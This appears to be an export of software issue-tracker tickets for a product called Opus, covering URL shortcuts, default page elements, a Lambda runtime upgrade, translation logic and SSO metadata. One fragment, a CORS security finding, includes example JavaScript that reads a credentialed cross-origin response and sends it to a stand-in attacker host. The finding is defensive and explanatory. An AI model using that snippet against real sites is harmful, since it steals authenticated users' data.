We don't display that information in any of the document, element, language, customer or element lists.

REB-6256,CLONE - SAP Support - Allow URL to contain only a single piece of metadata to get a list of documents,"Based off of the client’s feedback, they want this URL to have the ability to pull back documents based off of only one piece of metadata.  Currently, you must enter the Caption and Process to pull anything back.  See last comments in REB-5311 for approach.As any user of the system, if I click a URL from an SAP instance, we need to support a specifically formatted URL that will open the Advisor page or the document directly. This would work like Advisor does, however, instead of Advisor detecting the context and metadata, those values would be contained within the URL.Note: This applies to ANY application where a URL could be added, not just SAP. The functional requirement is about the URL format and what it loads in the portal.  It is critical that a user can enter a single piece of metadata (like Department or Application), with NO Caption or Process defined, and pull back all documents that match that single piece of metadata - {color:#ff5630}*Format Example:*{color}{color:#ff5630}<full account url>/landing/advisor/shortcut?department=Finance{color}* Custom Metadata must also be allowed in the URL search.* Provide specific URL format for the application that can include ANY of the metadata associated with a document (Caption, URL, Process, application, etc) Example: ""Application=Microsoft Excel""* The metadata in the URL must ALL match in order for the document or documents to match (they have an AND relationship). If the metadata exists in the customer account, and the document or documents lack it entirely (have NULL for that metadata) they will NOT match* If one or more of the metadata in the URL are MISSING in the customer account, they will be ignored for matching purposes. They will not create a match or prevent a match** If ALL the metadata in the URL are missing in the customer account then no matches will be provided* If more than 1 document matches the metadata provided by the URL, direct the user to the Advisor page and display the documents as if they had been suggested by advisor* If only 1 document matches the metadata provided by the URL, display the Eassistant in it's own browser tab, with the smaller width to fit Eassistant doctype.* If no matches are found, the user should be directed to the Advisor screen for their account anyway. The Advisor page should display the ‘No content matches your context’ message, unless they have previous Advisor hits to display there.*Note:* We also need to support published content that is not a typical document (PDF, PPT, PNG, etc.)Right now if we link to one of those documents using this approach, it attempts to open it in the Viewer and throws an error. We need to have Opus handle them as it normally does.*Note:* We are *not* covering sub-levels of hierarchy custom metadata in this story, as per Erick’s comments below.",13

For Titles and Footers, I will set them as the default for all content types using a checkbox, like so:Set as Default (checkbox)When I set an element as default:1. It will be automatically added to new recordings, in the appropriate place for its category (for example, if I am creating a new default footer, it will be added at the end. Title, it will be added at the beginning. Etc.)2. For Headers, I use a ‘content type' dropdown for this setting, so this will be the default element for as many or as few content types as I require. I could create a new default for the Standard and Enduser headers, and another default for the Accessibility and Generic headers.For Titles / Footers, they are either the default for all content types or they are not. If a default footer already exists, the option to make it the default is grayed out.3. If there is already a default for that content type and it hasn’t been disabled / rendered inactive (if I am editing a header, and the Standard default header is still active, for example) that checkbox in the dropdown will not be available. Since we don’t allow multiple Standard headers, multiple titles, multiple footers, and so on, if the customer account still has the original default active, setting a second default would not be useful, so we need to disable this option in that case. If the Standard default header is active but the generic and enduser default headers have been disabled, for example, the user should be able to choose either or both of the latter in the dropdown. If a default title or footer already exists, the option to make it the default is grayed out.If a default header exists for all content types, the “Set as Default” and dropdown will be hidden for the header you are editing. *Note:* As a reminder, this story does not cover Note and Basic elements, or any HTML elements that do not have defaults.

We need to update our code to 8.10:{panel:title=AWS Email}Your AWS Account currently has one or more Lambda functions using the node.js 6.10 runtime. The Node Foundation has previously published that node.js 6.x ""Boron"" will be declared End-of-Life (EOL) on April 2019 [1], and will stop receiving bug fixes, security updates, or performance improvements. Per the AWS Lambda runtime support policy [2], language runtimes that have reached their EOL are deprecated in AWS Lambda.Invokes for functions configured to run on node.js 6.10 will continue to work normally, however the ability to create new Lambda functions configured to use the node.js 6.10 runtime will be disabled on April 30 2019. Code updates to existing functions using node.js 6.10 will be disabled 30 days later on May 30 2019We encourage you to update your node.js 6.10 functions to a newer version of the Node runtime (node.js 8.10) so that you continue to benefit from important security, performance, and functionality enhancements offered by more recent releases. The newer node.js 8.10 version has improved ECMAScript support, along with other language and API improvements. The AWS Lambda programming model [3] for node.js 8.10 maintains backwards compatibility with previous versions to simplify portability.

Configurations to be aware of are setting the Access-Control-Allow-Origin response header to the wildcard * , null or directly using any domain from the Origin request header. These configurations could potentially allow for arbitrary domains to access the contents of the response. A victim could visit a malicious site that attempts to make cross-origin requests on the victim's behalf to try to access the response contents. The application should restrict access to only necessary domains wherever possible.CORS does include additional configurations such as requiring the Access-Control-Allow-Credentials flag be set to true if cookies need to be sent to access authenticated responses. There's also a safety measures in place so that applications cannot use the wildcard in the Access-Control-Allow-Origin header when the credentials flag is true. It's important to understand the various configurations for CORS (https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) and determine what makes sense for the application.Example JavaScript code to steal response content cross-origin assuming the response allows arbitrary domain access and allows credentials to be sent:var req = new XMLHttpRequest();req.onload = listener;req.open('get','https://www.example.com/api/info',true);req.withCredentials = true;req.send();function listener(){ location='https://www.atttacker.com/log?resp='+this.responseText; };Note:The null origin can be set from any site using a sandboxed iframe.

REB-4480,Step Element - Adjust Translation Logic,"As a translator or any user with permission to add/edit elements, I need a much better translation than what is currently provided with google. To do this, we need to implement some new logic:* Ensure that when a new language is added, the Actions and Controls are Translated BEFORE the Elements are translated. This will ensure that the new logic will work as well as possible.* Instead of translating small parts of the elements with Google, we need to translate the whole sentence at once. This is because the result may be different when translating individual words instead of a 1 whole sentence.** When translating from English, send the ENTIRE element will all the values included** See the basic rules below:1. Send full English element with all dynamic fields complete. Use the actual action and control and use the placeholder values for value and label.2. When passing in the full element, we should exclude value and label from translation so that they are always english. It appears this can be done by including quotes (ie. 'sample') but we should use the official way to exclude a word.3. When the full translation is returned, identify Action and control values if they map to existing action and controls for that language and replace them with the dynamic values for action and control4. If either the Action or the Control could NOT be mapped and replaced with the Dynamic value, we need to mark this element, so that they know it needs to be edited manually. If the value can not be mapped, then the element will just contain static text.For example, the following would be the dynamic fields:%%Action%% %%Value%% in the %%Label%% %%Control%%*Values:*Action: Use actual action. If an element has multiple English translations, use the first in the list.Control: Use actual control. If an element has multiple English translations, use the first in the list.Value: Use placeholder value SampleLable: Use placeholder value SaveIn English, this might be sent as: Type 'sample' in the 'save' fieldIn German, we would get this back as: Geben Sie ""sample"" in das Feld ""save"" ein*Mapping:*The ""Type"" action in german in opus is ""Geben Sie"", so we can map the dynamic value correctlyThe ""field"" control in german in opus is ""Feld"", so we can map the dynamic value correctlySo the German translation should be:%%Action%% ""sample"" in das %%Control%% ""save"" ein* If either the Action or Control is not mapped correctly, include a flag icon in the row so they know that it needs edited to correctly use dynamic values** Hovering over the flag icon should include a tooltip: ""Not Mapped: Action & Control"" but only include the fields that were not mapped correctly.** Once the field is edited in any way, remove the flag.* We need to include a button in the WYSIWYG editor for Google Translate so that the user can manually re-translate the element text and then edit it immediately** Use the following icon and position it on the very right side of the WYSIWYG editor: https://materialdesignicons.com/icon/translate. Hover over should be ""Re-translate""** This would appear for all non-english languages** Replace all the text in the WYSIWYG editor with the new translation* We should include the ""undo"" button in the WYSIWYG editor so that they user can undo their changes include undo-ing a translation.",8

For this development, we will only focus on the field the user is actively working on and not the other fields that may be autocompleted with this action.For example, in the image below, you can see the user typed 'bon' for the email field and then Chrome autofilled their actual email address - since we have the next step highlighted, we can see the full email address has been entered.

REB-4335,CLONE - Add application into SSO - Config and testing,"We need to be able to set the application via SSO as well. Without this, there is NO way for an admin to set the application for users when SSO is enabled, which is a big problem.If custom metadata is required, but there is no application set for a user, the metadata page is blank but you can't ever leave the page as a user. This is a problem with SSO particularly because the admin can't set the users applications for them (via SSO). If the user doesn't have any applications, then they should NOT have to complete any custom metadata (since they would have none).The system overwriting metadata on each login is big problem because it totally breaks the ""user configurable"" option since it will remove any additions the very next time they sign in. Please see the details rule below- Admin sets metadata via SSO (ie. multi = Value 1, Value 2)- Content user logs in via SSO and they can see that Value 1 and Value 2 are applied to their profile- Since attribute is user configurable, content user changes values to Value 3, Value 4 and saves. They confirm the values are updated.- They logout and log back in, but when they check their metadata, the attribute has been overwritten to Value 1, Value 2 again. Instead it should only ADD values. So in this example, in #4, I should expect all values: Value 1 (SSO), Value 2 (SSO), Value 3 (manual), Value 4 (manual)- For items where it is a single field AND is user configurable, if they change it manually, it would no longer update from SSO- if we don't set ""user configurable"", we will override is as normal- About hierarchy, it will merge data between SSO and our system for hierarchyCc: [~accountid:557058:fdcd0674-85c2-4560-ba37-adfff5fbb8bb]",2
